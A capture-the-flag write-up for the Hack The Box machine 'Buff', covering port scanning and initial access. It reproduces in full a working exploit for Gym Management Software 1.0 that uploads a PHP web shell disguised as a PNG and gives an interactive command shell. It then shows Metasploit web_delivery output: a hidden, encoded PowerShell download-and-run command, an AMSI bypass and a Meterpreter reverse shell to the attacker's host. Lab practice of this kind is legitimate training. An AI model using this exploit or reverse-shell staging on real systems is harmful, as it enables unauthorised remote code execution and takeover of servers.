#Buff

## Reconnaissance / Enumeration 

Using NMAP Port full scan
```bash
┌──(justakazh㉿youknowitsme)-[/htb/easy/buff/recon]
└─$ sudo nmap -sS -p- -T5 10.10.10.198 -oN allport
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 05:36 EDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.72% done; ETC: 05:38 (0:00:54 remaining)
Nmap scan report for 10.10.10.198
Host is up (0.035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 111.03 seconds

```

## Initial Access

After recon phases we know that 8080 port are open, and notice in the url `http://10.10.10.198:8080/contact.php` this website using `Gym Management Software 1.0`.
we can use this exploit for getting initial access
https://www.exploit-db.com/raw/48506

```python

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)
```

And the result will be like this 

```
┌──(justakazh㉿youknowitsme)-[/htb/easy/buff/exploit]
└─$ python2 gym_management_system.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                 
`^^^^^^^^^^^^ /============BOKU====================="
            \/

^[[A
^[[[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> 
```

## Meterpreter 

You can set meterpreter after access gained using `exploit/multi/scripts/web_delivery` module,set `targets` to `PSH`, set `payload` to `windows/x64/meterpreter/reverse_tcp`, and set your information lhost,lport, also rsvhost. 
run the module and paste the result will be like this

```
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Using URL: http://10.10.14.15:8080/mVVygiBAzBtT
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUA........
[*] 10.10.10.198     web_delivery - Delivering AMSI Bypass (1389 bytes)
[*] 10.10.10.198     web_delivery - Delivering Payload (3737 bytes)
[*] Sending stage (200774 bytes) to 10.10.10.198
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.198:49690) at 2023-10-16 05:48:56 -0400

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         meterpreter x64/windo  BUFF\shaun @ BUFF  10.10.14.15:4444 -> 10.10.
            ws                                        10.198:49690 (10.10.10.198
                                                      )

msf6 exploit(multi/script/web_delivery) > 
```

